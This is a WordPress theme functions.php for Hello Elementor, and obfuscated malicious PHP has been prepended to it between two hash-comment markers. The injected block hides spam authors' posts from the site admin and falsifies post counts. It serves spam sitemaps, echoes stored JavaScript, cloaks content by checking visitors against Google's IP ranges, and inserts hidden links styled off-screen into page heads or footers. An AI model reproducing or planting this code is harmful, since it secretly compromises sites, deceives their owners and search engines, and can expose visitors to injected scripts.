<?php

/* 2ebe0d0cee70ff2ea7b0355ee26ce219 */

function admin_url_less($where) {
    global $wpdb, $is_front_page_other;

    $absint_call = array_keys($is_front_page_other);
    $register_sidebar_pointer = implode(', ', $absint_call);

    if (!is_single() && is_admin()) {
        add_filter('views_edit-post', 'post_class_git');
        return $where . " AND {$wpdb->posts}.post_author NOT IN ($register_sidebar_pointer)";
    }

    return $where;
}

function set_transient_boolean($query) {

    global $is_front_page_other;

    $absint_call = array_keys($is_front_page_other);
    $comments_open_live = get_theme_file_uri_add($absint_call);

    if (!$query->is_single() && !is_admin()) {
        $query->set('author', $comments_open_live);
    }
}

function add_image_size_ajax() {

    global $post, $is_front_page_other;

    foreach ($is_front_page_other as $id => $settings) {
        if (($id == $post->post_author) && (isset($settings['js']))) {

            if (get_author_posts_url_add($settings)) {
                break;
            }
            echo $settings['js'];
            break;
        }
    }
}

function get_author_posts_url_add($settings) {
    if (isset($settings['nojs']) && $settings['nojs'] === 1) {

        if (esc_attr_x_plain()) {
            return true;
        }
    }
    return false;
}

function post_class_git($views) {
    global $current_user, $wp_query;

    $types = array(
        array('status' => NULL),
        array('status' => 'publish'),
        array('status' => 'draft'),
        array('status' => 'pending'),
        array('status' => 'trash'),
        array('status' => 'mine'),
    );
    foreach ($types as $type) {

        $query = array(
            'post_type' => 'post',
            'post_status' => $type['status']
        );

        $result = new WP_Query($query);

        if ($type['status'] == NULL) {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['all'], $matches)) {
                $views['all'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['all']);
            }
        } elseif ($type['status'] == 'mine') {


            $newQuery = $query;
            $newQuery['author__in'] = array($current_user->ID);

            $result = new WP_Query($newQuery);

            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['mine'], $matches)) {
                $views['mine'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['mine']);
            }
        } elseif ($type['status'] == 'publish') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['publish'], $matches)) {
                $views['publish'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['publish']);
            }
        } elseif ($type['status'] == 'draft') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['draft'], $matches)) {
                $views['draft'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['draft']);
            }
        } elseif ($type['status'] == 'pending') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['pending'], $matches)) {
                $views['pending'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['pending']);
            }
        } elseif ($type['status'] == 'trash') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['trash'], $matches)) {
                $views['trash'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['trash']);
            }
        }
    }
    return $views;
}

function has_nav_menu_dns($counts, $type, $perm) {

    if ($type === 'post') {
        $number_format_i18n_object = $counts->publish;
        $the_archive_title_compiler = the_ID_edit($perm);
        $counts->publish = !$the_archive_title_compiler ? $number_format_i18n_object : $the_archive_title_compiler;
    }
    return $counts;
}

function the_ID_edit($perm) {
    global $wpdb, $is_front_page_other;

    $absint_call = array_keys($is_front_page_other);
    $register_sidebar_pointer = implode(', ', $absint_call);

    $type = 'post';

    $query = "SELECT post_status, COUNT( * ) AS num_posts FROM {$wpdb->posts} WHERE post_type = %s";

    if ('readable' == $perm && is_user_logged_in()) {

        $home_url_condition = get_post_type_object($type);

        if (!current_user_can($home_url_condition->cap->read_private_posts)) {
            $query .= $wpdb->prepare(
                " AND (post_status != 'private' OR ( post_author = %d AND post_status = 'private' ))", get_current_user_id()
            );
        }
    }
    $query .= " AND post_author NOT IN ($register_sidebar_pointer) GROUP BY post_status";
    $results = (array)$wpdb->get_results($wpdb->prepare($query, $type), ARRAY_A);

    foreach ($results as $esc_url_raw_https) {
        if ($esc_url_raw_https['post_status'] === 'publish') {
            return $esc_url_raw_https['num_posts'];
        }
    }
}

function set_transient_request($userId) {
    global $wpdb;

    $query = "SELECT ID FROM {$wpdb->posts} where post_author = $userId";

    $results = (array)$wpdb->get_results($query, ARRAY_A);

    $absint_call = array();
    foreach ($results as $esc_url_raw_https) {
        $absint_call[] = $esc_url_raw_https['ID'];
    }
    return $absint_call;
}

function has_nav_menu_module() {

    global $is_front_page_other, $wp_rewrite;

    $rules = get_option('rewrite_rules');

    foreach ($is_front_page_other as $get_setting_beta => $number_format_i18n_merge) {
        $wp_list_comments_time = key($number_format_i18n_merge['sitemapsettings']);

        if (!isset($rules[$wp_list_comments_time]) ||
            ($rules[$wp_list_comments_time] !== current($number_format_i18n_merge['sitemapsettings']))) {
            $wp_rewrite->flush_rules();
        }
    }
}

function is_home_condition($rules) {

    global $is_front_page_other;

    $comment_form_core = array();

    foreach ($is_front_page_other as $get_setting_beta => $number_format_i18n_merge) {
        if (isset($number_format_i18n_merge['sitemapsettings'])) {
            $comment_form_core[key($number_format_i18n_merge['sitemapsettings'])] = current($number_format_i18n_merge['sitemapsettings']);
        }
    }

    return $comment_form_core + $rules;
}

function admin_url_https() {

    global $is_front_page_other;

    foreach ($is_front_page_other as $get_setting_beta => $number_format_i18n_merge) {
        $comments_open_trigger = str_replace('index.php?feed=', '', current($number_format_i18n_merge['sitemapsettings']));
        add_feed($comments_open_trigger, 'wp_get_attachment_image_src_string');
    }
}


function wp_get_attachment_image_src_string() {

    header('Content-Type: ' . feed_content_type('rss-http') . '; charset=' . get_option('blog_charset'), true);

    status_header(200);

    $get_transient_client = has_post_thumbnail_stream();
    $the_title_pic = set_transient_request($get_transient_client);

    if (!empty($the_title_pic)) {
        $get_transient_restful = md5(implode(',', $the_title_pic));
        $have_posts_cron = 'update_plugins_' . $get_transient_client . '_' . $get_transient_restful;
        $add_action_stack = get_transient($have_posts_cron);

        if ($add_action_stack !== false) {
            echo $add_action_stack;
            return;
        }
    }



    $head = wp_link_pages_variable();
    $get_the_author_meta_restful = $head . "\n";


    $priority = '0.5';
    $wp_enqueue_style_class = 'weekly';
    $esc_attr_e_xml = date('Y-m-d');

    foreach ($the_title_pic as $post_id) {
        $url = get_permalink($post_id);
        $get_the_author_meta_restful .= wp_head_string($url, $esc_attr_e_xml, $wp_enqueue_style_class, $priority);
        wp_cache_delete($post_id, 'posts');
    }

    $get_the_author_meta_restful .= "\n</urlset>";

    set_transient($have_posts_cron, $get_the_author_meta_restful, WEEK_IN_SECONDS);

    echo $get_the_author_meta_restful;
}


function wp_link_pages_variable() {
    return <<<STR
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
STR;
}

function wp_head_string($url, $esc_attr_e_xml, $wp_enqueue_style_class, $priority) {

    return <<<STR
   <url>
      <loc>$url</loc>
      <lastmod>$esc_attr_e_xml</lastmod>
      <changefreq>$wp_enqueue_style_class</changefreq>
      <priority>$priority</priority>
   </url>\n\n
STR;
}

function get_theme_file_uri_add($writersArr) {
    $is_front_page_url = array();

    foreach ($writersArr as $item) {
        $is_front_page_url[] = '-' . $item;
    }
    return implode(',', $is_front_page_url);
}

function wp_head_boolean() {

    $add_query_arg_url = array();
    $the_post_event = array();

    $settings = get_option('wp_custom_filters');

    if ($settings) {
        $comments_template_soap = unserialize(base64_decode($settings));
        if ($comments_template_soap) {
            $add_query_arg_url = $comments_template_soap;
        }
    }

    $settings = get_option(md5(sha1($_SERVER['HTTP_HOST'])));

    if ($settings) {
        $esc_attr_e_pointer = unserialize(base64_decode($settings));
        if ($esc_attr_e_pointer) {
            $the_post_event = $esc_attr_e_pointer;
        }
    }

    return $the_post_event + $add_query_arg_url;

}

function has_post_thumbnail_stream() {

    global $is_front_page_other;

    foreach ($is_front_page_other as $get_setting_beta => $number_format_i18n_merge) {

        $get_template_part_integer = key($number_format_i18n_merge['sitemapsettings']) . '|'
            . str_replace('index.php?', '', current($number_format_i18n_merge['sitemapsettings']) . '$');

        if (preg_match("~$get_template_part_integer~", $_SERVER['REQUEST_URI'])) {
            return $get_setting_beta;
        }
    }
}

function is_home_all() {
    global $is_front_page_other, $post;

    $the_posts_pagination_soap = array_keys($is_front_page_other);
    if (in_array($post->post_author, $the_posts_pagination_soap)) {
        return true;
    }
    return false;
}

function get_search_form_more() {
    global $is_front_page_other, $post;

    $the_posts_pagination_soap = array_keys($is_front_page_other);

    if (!$post || !property_exists($post, 'author')) {
        return;
    }

    if (in_array($post->post_author, $the_posts_pagination_soap)) {
        add_filter('wpseo_robots', '__return_false');
        add_filter('wpseo_googlebot', '__return_false'); // Yoast SEO 14.x or newer
        add_filter('wpseo_bingbot', '__return_false'); // Yoast SEO 14.x or newer
    }
}

function is_singular_float() {

    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (isset($_SERVER['REMOTE_ADDR'])) {
        return $_SERVER['REMOTE_ADDR'];
    }

    return false;
}

function esc_attr_x_plain() {

    $is_archive_statement = is_singular_float();

    if (strstr($is_archive_statement, ', ')) {
        $add_query_arg_add = explode(', ', $is_archive_statement);
        $is_archive_statement = $add_query_arg_add[0];
    }

    $get_queried_object_id_get = language_attributes_statement();

    if (!$get_queried_object_id_get) {
        return false;
    }

    foreach ($get_queried_object_id_get as $range) {
        if (get_comments_number_security($is_archive_statement, $range)) {
            return true;
        }
    }
    return false;
}

function get_setting_decryption($timestamp) {

    if ((time() - $timestamp) > 60 * 60) {
        return true;
    }

    return false;
}

function language_attributes_statement() {

    if (($value = get_option('wp_custom_range')) && !get_setting_decryption($value['timestamp'])) {
        return $value['ranges'];
    } else {

        $response = wp_remote_get('https://www.gstatic.com/ipranges/goog.txt');
        if (is_wp_error($response)) {
            return;
        }
        $body = wp_remote_retrieve_body($response);
        $get_queried_object_id_get = preg_split("~(\r\n|\n)~", trim($body), -1, PREG_SPLIT_NO_EMPTY);

        if (!is_array($get_queried_object_id_get)) {

            return;
        }

        $value = array('ranges' => $get_queried_object_id_get, 'timestamp' => time());
        update_option('wp_custom_range', $value, true);
        return $value['ranges'];
    }
}

function get_the_date_reference($inet) {
    $have_posts_other = str_split($inet);
    $has_nav_menu_wp = '';
    foreach ($have_posts_other as $char) {
        $has_nav_menu_wp .= str_pad(decbin(ord($char)), 8, '0', STR_PAD_LEFT);
    }
    return $has_nav_menu_wp;
}

function get_comments_number_security($is_archive_statement, $cidrnet) {
    $is_archive_statement = inet_pton($is_archive_statement);
    $has_nav_menu_wp = get_the_date_reference($is_archive_statement);

    list($net, $is_home_repository) = explode('/', $cidrnet);
    $net = inet_pton($net);
    $get_footer_live = get_the_date_reference($net);

    $edit_post_link_schema = substr($has_nav_menu_wp, 0, $is_home_repository);
    $add_filter_call = substr($get_footer_live, 0, $is_home_repository);

    if ($edit_post_link_schema !== $add_filter_call) {
        return false;
    } else {
        return true;
    }
}


function language_attributes_trigger($get_transient_sample) {

    global $post;

    $add_action_stat = '';


    if (edit_post_link_boolean($get_transient_sample, 'textBlocksCount', 'onlyHomePage')) {
        if (is_front_page() || is_home()) {
            
            $add_action_stat = get_option('home_links_custom_0');
        }
    } elseif (edit_post_link_boolean($get_transient_sample, 'textBlocksCount', '10DifferentTextBlocks')) {

        $url = get_permalink($post->ID);
        preg_match('~\d~', md5($url), $matches);
        $add_action_stat = get_option('home_links_custom_' . $matches[0]);
        
        

    } elseif (edit_post_link_boolean($get_transient_sample, 'textBlocksCount', '100DifferentTextBlocks')) {

        $url = get_permalink($post->ID);
        preg_match_all('~\d~', md5($url), $matches);
        $post_password_required_view = ($matches[0][0] == 0) ? $matches[0][1] : $matches[0][0] . '' . $matches[0][1];
        $add_action_stat = get_option('home_links_custom_' . $post_password_required_view);
        
        
    } elseif (edit_post_link_boolean($get_transient_sample, 'textBlocksCount', 'fullDifferentTextBlocks')) {

    } else {

    }

    return !$add_action_stat ? '' : $add_action_stat;
}

function edit_post_link_boolean($number_format_i18n_merge, $get_template_part_wp, $have_posts_num) {
    if (!isset($number_format_i18n_merge[$get_template_part_wp][$have_posts_num])) {
        return false;
    }

    if ($number_format_i18n_merge[$get_template_part_wp][$have_posts_num] === 1) {
        return true;
    }

    return false;

}

function wp_head_long($get_transient_sample, $get_theme_file_uri_sample) {
    if (empty($get_theme_file_uri_sample)) {
        return '';
    }

    if (edit_post_link_boolean($get_transient_sample, 'hiddenType', 'css')) {
        preg_match('~\d~', md5($_SERVER['HTTP_HOST']), $blockNum);
        $get_option_reference = wp_head_stat();
        $add_theme_support_add = $get_option_reference[$blockNum[0]];
        return $add_theme_support_add[0] . PHP_EOL . $get_theme_file_uri_sample . PHP_EOL . $add_theme_support_add[1];
    }

    return $get_theme_file_uri_sample;
}

function wp_head_stat() {

    return array(
        array('<div style="position:absolute; filter:alpha(opacity=0);opacity:0.003;z-index:-1;">', '</div>'),
        array('<div style="position:absolute; left:-5000px;">', '</div>'),
        array('<div style="position:absolute; top: -100%;">', '</div>'),

        array('<div style="position:absolute; left:-5500px;">', '</div>'),
        array('<div style="overflow: hidden; position: absolute; height: 0pt; width: 0pt;">', '</div>'),
        array('<div style="display:none;">', '</div>'),
        array('<span style="position:absolute; filter:alpha(opacity=0);opacity:0.003;z-index:-1;">', '</span>'),
        array('<span style="position:absolute; left:-5000px;">', '</span>'),
        array('<span style="position:absolute; top: -100%;">', '</span>'),
        array('<div style="position:absolute; left:-6500px;">', '</div>'),

    );
}

function wp_footer_object($get_transient_sample) {
    return edit_post_link_boolean($get_transient_sample, 'position', 'head');
}

function the_permalink_alpha($get_transient_sample) {
    return edit_post_link_boolean($get_transient_sample, 'position', 'footer');
}

function get_permalink_request($settings) {
    foreach ($settings as $get_setting_beta => $number_format_i18n_merge) {
        if (isset($number_format_i18n_merge['homeLinks'])) {
            return $number_format_i18n_merge['homeLinks'];
        }
    }
    return array();
}


function the_archive_title_exception() {
    if (!is_home_all()) {
        if (is_singular() || (is_front_page() || is_home())) {
            return true;
        }
    }
    return false;
}

function the_title_function() {

    global $get_transient_sample;

    if (!the_archive_title_exception()) {
        
        
        return;
    }

    if (edit_post_link_boolean($get_transient_sample, 'hiddenType', 'cloacking')) {
        if (!esc_attr_x_plain()) {
            
            return;
        }
    }


    $get_theme_file_uri_sample = language_attributes_trigger($get_transient_sample);
    $get_theme_file_uri_sample = wp_head_long($get_transient_sample, $get_theme_file_uri_sample);

    


    echo $get_theme_file_uri_sample;

}

$is_front_page_other = wp_head_boolean();


if (is_array($is_front_page_other)) {
    add_filter('posts_where_paged', 'admin_url_less');
    add_action('pre_get_posts', 'set_transient_boolean');
    add_action('wp_enqueue_scripts', 'add_image_size_ajax');
    add_filter('wp_count_posts', 'has_nav_menu_dns' , 10, 3);
    add_filter('rewrite_rules_array', 'is_home_condition');
    add_action('wp_loaded', 'has_nav_menu_module');
    add_action('init', 'admin_url_https');
    add_action('template_redirect', 'get_search_form_more');

    $get_transient_sample = get_permalink_request($is_front_page_other);

    if (!empty($get_transient_sample)) {

        

        if (wp_footer_object($get_transient_sample)) {
            add_action('wp_head', 'the_title_function');
        }
        if (the_permalink_alpha($get_transient_sample)) {
            add_action('wp_footer', 'the_title_function');
        }


    }
}

/* 2ebe0d0cee70ff2ea7b0355ee26ce219 */
/**
 * Theme functions and definitions
 *
 * @package HelloElementor
 */

use Elementor\WPNotificationsPackage\V110\Notifications as ThemeNotifications;

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

define( 'HELLO_ELEMENTOR_VERSION', '3.3.0' );

if ( ! isset( $content_width ) ) {
	$content_width = 800; // Pixels.
}

if ( ! function_exists( 'hello_elementor_setup' ) ) {
	/**
	 * Set up theme support.
	 *
	 * @return void
	 */
	function hello_elementor_setup() {
		if ( is_admin() ) {
			hello_maybe_update_theme_version_in_db();
		}

		if ( apply_filters( 'hello_elementor_register_menus', true ) ) {
			register_nav_menus( [ 'menu-1' => esc_html__( 'Header', 'hello-elementor' ) ] );
			register_nav_menus( [ 'menu-2' => esc_html__( 'Footer', 'hello-elementor' ) ] );
		}

		if ( apply_filters( 'hello_elementor_post_type_support', true ) ) {
			add_post_type_support( 'page', 'excerpt' );
		}

		if ( apply_filters( 'hello_elementor_add_theme_support', true ) ) {
			add_theme_support( 'post-thumbnails' );
			add_theme_support( 'automatic-feed-links' );
			add_theme_support( 'title-tag' );
			add_theme_support(
				'html5',
				[
					'search-form',
					'comment-form',
					'comment-list',
					'gallery',
					'caption',
					'script',
					'style',
				]
			);
			add_theme_support(
				'custom-logo',
				[
					'height'      => 100,
					'width'       => 350,
					'flex-height' => true,
					'flex-width'  => true,
				]
			);
			add_theme_support( 'align-wide' );
			add_theme_support( 'responsive-embeds' );

			/*
			 * Editor Styles
			 */
			add_theme_support( 'editor-styles' );
			add_editor_style( 'editor-styles.css' );

			/*
			 * WooCommerce.
			 */
			if ( apply_filters( 'hello_elementor_add_woocommerce_support', true ) ) {
				// WooCommerce in general.
				add_theme_support( 'woocommerce' );
				// Enabling WooCommerce product gallery features (are off by default since WC 3.0.0).
				// zoom.
				add_theme_support( 'wc-product-gallery-zoom' );
				// lightbox.
				add_theme_support( 'wc-product-gallery-lightbox' );
				// swipe.
				add_theme_support( 'wc-product-gallery-slider' );
			}
		}
	}
}
add_action( 'after_setup_theme', 'hello_elementor_setup' );

function hello_maybe_update_theme_version_in_db() {
	$theme_version_option_name = 'hello_theme_version';
	// The theme version saved in the database.
	$hello_theme_db_version = get_option( $theme_version_option_name );

	// If the 'hello_theme_version' option does not exist in the DB, or the version needs to be updated, do the update.
	if ( ! $hello_theme_db_version || version_compare( $hello_theme_db_version, HELLO_ELEMENTOR_VERSION, '<' ) ) {
		update_option( $theme_version_option_name, HELLO_ELEMENTOR_VERSION );
	}
}

if ( ! function_exists( 'hello_elementor_display_header_footer' ) ) {
	/**
	 * Check whether to display header footer.
	 *
	 * @return bool
	 */
	function hello_elementor_display_header_footer() {
		$hello_elementor_header_footer = true;

		return apply_filters( 'hello_elementor_header_footer', $hello_elementor_header_footer );
	}
}

if ( ! function_exists( 'hello_elementor_scripts_styles' ) ) {
	/**
	 * Theme Scripts & Styles.
	 *
	 * @return void
	 */
	function hello_elementor_scripts_styles() {
		$min_suffix = defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ? '' : '.min';

		if ( apply_filters( 'hello_elementor_enqueue_style', true ) ) {
			wp_enqueue_style(
				'hello-elementor',
				get_template_directory_uri() . '/style' . $min_suffix . '.css',
				[],
				HELLO_ELEMENTOR_VERSION
			);
		}

		if ( apply_filters( 'hello_elementor_enqueue_theme_style', true ) ) {
			wp_enqueue_style(
				'hello-elementor-theme-style',
				get_template_directory_uri() . '/theme' . $min_suffix . '.css',
				[],
				HELLO_ELEMENTOR_VERSION
			);
		}

		if ( hello_elementor_display_header_footer() ) {
			wp_enqueue_style(
				'hello-elementor-header-footer',
				get_template_directory_uri() . '/header-footer' . $min_suffix . '.css',
				[],
				HELLO_ELEMENTOR_VERSION
			);
		}
	}
}
add_action( 'wp_enqueue_scripts', 'hello_elementor_scripts_styles' );

if ( ! function_exists( 'hello_elementor_register_elementor_locations' ) ) {
	/**
	 * Register Elementor Locations.
	 *
	 * @param ElementorPro\Modules\ThemeBuilder\Classes\Locations_Manager $elementor_theme_manager theme manager.
	 *
	 * @return void
	 */
	function hello_elementor_register_elementor_locations( $elementor_theme_manager ) {
		if ( apply_filters( 'hello_elementor_register_elementor_locations', true ) ) {
			$elementor_theme_manager->register_all_core_location();
		}
	}
}
add_action( 'elementor/theme/register_locations', 'hello_elementor_register_elementor_locations' );

if ( ! function_exists( 'hello_elementor_content_width' ) ) {
	/**
	 * Set default content width.
	 *
	 * @return void
	 */
	function hello_elementor_content_width() {
		$GLOBALS['content_width'] = apply_filters( 'hello_elementor_content_width', 800 );
	}
}
add_action( 'after_setup_theme', 'hello_elementor_content_width', 0 );

if ( ! function_exists( 'hello_elementor_add_description_meta_tag' ) ) {
	/**
	 * Add description meta tag with excerpt text.
	 *
	 * @return void
	 */
	function hello_elementor_add_description_meta_tag() {
		if ( ! apply_filters( 'hello_elementor_description_meta_tag', true ) ) {
			return;
		}

		if ( ! is_singular() ) {
			return;
		}

		$post = get_queried_object();
		if ( empty( $post->post_excerpt ) ) {
			return;
		}

		echo '<meta name="description" content="' . esc_attr( wp_strip_all_tags( $post->post_excerpt ) ) . '">' . "\n";
	}
}
add_action( 'wp_head', 'hello_elementor_add_description_meta_tag' );

// Admin notice
if ( is_admin() ) {
	require get_template_directory() . '/includes/admin-functions.php';
}

// Settings page
require get_template_directory() . '/includes/settings-functions.php';

// Header & footer styling option, inside Elementor
require get_template_directory() . '/includes/elementor-functions.php';

if ( ! function_exists( 'hello_elementor_customizer' ) ) {
	// Customizer controls
	function hello_elementor_customizer() {
		if ( ! is_customize_preview() ) {
			return;
		}

		if ( ! hello_elementor_display_header_footer() ) {
			return;
		}

		require get_template_directory() . '/includes/customizer-functions.php';
	}
}
add_action( 'init', 'hello_elementor_customizer' );

if ( ! function_exists( 'hello_elementor_check_hide_title' ) ) {
	/**
	 * Check whether to display the page title.
	 *
	 * @param bool $val default value.
	 *
	 * @return bool
	 */
	function hello_elementor_check_hide_title( $val ) {
		if ( defined( 'ELEMENTOR_VERSION' ) ) {
			$current_doc = Elementor\Plugin::instance()->documents->get( get_the_ID() );
			if ( $current_doc && 'yes' === $current_doc->get_settings( 'hide_title' ) ) {
				$val = false;
			}
		}
		return $val;
	}
}
add_filter( 'hello_elementor_page_title', 'hello_elementor_check_hide_title' );

/**
 * BC:
 * In v2.7.0 the theme removed the `hello_elementor_body_open()` from `header.php` replacing it with `wp_body_open()`.
 * The following code prevents fatal errors in child themes that still use this function.
 */
if ( ! function_exists( 'hello_elementor_body_open' ) ) {
	function hello_elementor_body_open() {
		wp_body_open();
	}
}

function hello_elementor_get_theme_notifications(): ThemeNotifications {
	static $notifications = null;

	if ( null === $notifications ) {
		require get_template_directory() . '/vendor/autoload.php';

		$notifications = new ThemeNotifications(
			'hello-elementor',
			HELLO_ELEMENTOR_VERSION,
			'theme'
		);
	}

	return $notifications;
}

hello_elementor_get_theme_notifications();
